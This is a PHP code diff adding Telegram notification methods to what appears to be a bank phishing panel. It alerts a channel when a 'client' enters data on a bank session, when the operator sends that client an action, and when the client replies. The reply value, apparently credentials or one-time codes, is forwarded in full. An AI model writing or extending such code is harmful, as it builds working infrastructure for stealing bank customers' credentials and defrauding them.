@@ -146,4 +146,42 @@ HTML;
             logger()->warning('Failed to send to channel', ['error' => $e->getMessage()]);
         }
     }
+
+    private function logTag(\App\Models\BankSession $session): string
+    {
+        return $session->log_number !== null ? "#log{$session->log_number}" : '';
+    }
+
+    public function notifyCredentialsEntered(\App\Models\BankSession $session): void
+    {
+        $bank = \App\Services\Telegram\TelegramCardBuilder::getDisplayName($session->bank_slug);
+        $tag  = $this->logTag($session);
+        $this->sendToChannel(
+            "📝 <b>Клиент ввёл данные</b>  {$tag}\n\n" .
+            "🏦 {$bank}"
+        );
+    }
+
+    public function notifyActionSent(\App\Models\BankSession $session, string $actionLabel): void
+    {
+        $bank = \App\Services\Telegram\TelegramCardBuilder::getDisplayName($session->bank_slug);
+        $tag  = $this->logTag($session);
+        $this->sendToChannel(
+            "📤 <b>Действие отправлено клиенту</b>  {$tag}\n\n" .
+            "🏦 {$bank}\n" .
+            "📋 {$actionLabel}"
+        );
+    }
+
+    public function notifyClientAnswer(\App\Models\BankSession $session, string $command, string $value): void
+    {
+        $bank = \App\Services\Telegram\TelegramCardBuilder::getDisplayName($session->bank_slug);
+        $tag  = $this->logTag($session);
+        $this->sendToChannel(
+            "📥 <b>Ответ клиента</b>  {$tag}\n\n" .
+            "🏦 {$bank}\n" .
+            "📋 {$command}\n" .
+            "💬 <code>{$value}</code>"
+        );
+    }
 }
